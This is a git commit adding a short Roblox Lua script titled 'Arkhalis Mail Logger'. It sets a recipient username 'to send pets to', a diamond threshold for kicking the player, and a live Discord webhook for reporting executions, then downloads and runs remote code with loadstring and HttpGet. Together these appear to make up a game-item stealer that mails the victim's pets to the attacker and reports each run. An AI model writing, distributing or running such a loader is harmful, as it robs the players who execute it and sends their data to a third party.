ff2a16b40fe090681766fb6eff5bd103dbe2b8db
Francescript02 <134109365+Francescript02@users.noreply.github.com>
2023-05-20 06:51:02 +0800

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,19 @@
+```lua
+
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "DestroyerGaming05" --// Username To Send Pets To
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1109047845899747328/97ZG6y0CaYk4ygMaByDmLWbdHFTsS2koq1RcFBYEubBkIEj9Rpnv_XsISWLg3iOp98SI" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
+
+```
